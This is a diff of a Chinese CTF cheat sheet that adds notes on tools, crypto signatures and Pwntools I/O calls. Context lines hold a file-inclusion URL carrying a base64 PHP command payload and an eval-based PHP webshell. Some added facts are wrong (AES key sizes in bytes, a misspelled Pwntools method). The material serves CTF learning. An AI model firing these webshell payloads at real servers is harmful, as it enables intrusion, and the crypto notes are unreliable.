@@ -79,11 +79,12 @@
 
 ### Pwn
 
-- Pwntools：https://github.com/Gallopsled/pwntools
+- Pwntools：CTF框架和漏洞利用开发库 https://github.com/Gallopsled/pwntools
 
 ### Reverse
 
-- ExEinfo PE：查看PE文件信息 
+- ExEinfo PE：查看PE文件信息
+- PEID：查壳工具 
 - Cutter：https://cutter.re/
 - IDA：https://hex-rays.com/ida-pro/
 - Ollydbg：https://www.ollydbg.de/
@@ -103,6 +104,40 @@ grep -rn “flag{” /*
 find / -type f -name '*' | xargs grep "flag{"
 ```
 
+### Crypto
+
+#### 常见加密/编码算法特征
+
+##### Base64
+
+一般只包含以下字符：
+
+```
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
+```
+
+##### AES
+
+密钥长度是128bit或者256bit，长度都是16字节。
+
+密文是128或256的整倍数。
+
+##### DES
+
+密钥长度固定8字节。密钥需要运行初始化函数进行单独初始化。
+
+分段加密，每8字节分段。
+
+##### RSA
+
+非对称加密算法，密钥需要单独初始化。
+
+密钥长度一般很长，存储格式为base64文本。
+
+##### ECC
+
+密钥需要单独初始化。
+
 ### Misc
 
 #### 常用命令
@@ -112,7 +147,7 @@ find / -type f -name '*' | xargs grep "flag{"
 - 在文件无格式或格式不明时判断文件类型。
 
 ```
-➜  ~ file Exploit.class
+> file Exploit.class
 Exploit.class: compiled Java class data, version 52.0 (Java 1.8)
 ```
 
@@ -591,6 +626,65 @@ http://ip:port/readme.php?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKHdo
 
 # 也可以将webshell进行base64编码/或不编码
 http://ip:port/readme.php?filename=data://text/plain;base64,<?php eval($_POST["cmd"];)?>
+```
+
+### Pwn
+
+#### Pwntools
+
+导入包：
+
+```
+> from pwn import *
+```
+
+建立/关闭连接：
+
+```
+# 本地连接
+sh = process("./code")
+```
+
+```
+# 远程连接
+sh = remote("127.0.0.1",6666)
+```
+
+```
+# 关闭连接
+sh.close()
+```
+
+I/O操作：
+
+```
+# 发送数据
+sh.send(data)
+
+# 发送一行数据
+sh.sendline(data)
+```
+
+```
+# 接收数据，numb指定接收字节
+sh.recv(numb=1024, timeout = default)
+
+# 接收一行数据，keepends表示是否保留行尾\n
+sh.recvline(keepends = True)
+
+# 接收数据直到设置的标志出现
+sh.recvutil("Hello\n", drop=false)
+
+# 持续接收数据直到EOF
+sh.recvall()
+
+# 持续接收数据直到EOF或timeout
+sh.recvrepeat(timeout = default)
+```
+
+```
+# 直接进行交互，在取得shell后使用
+sh.interactive()
 ```
 
 ### Reverse
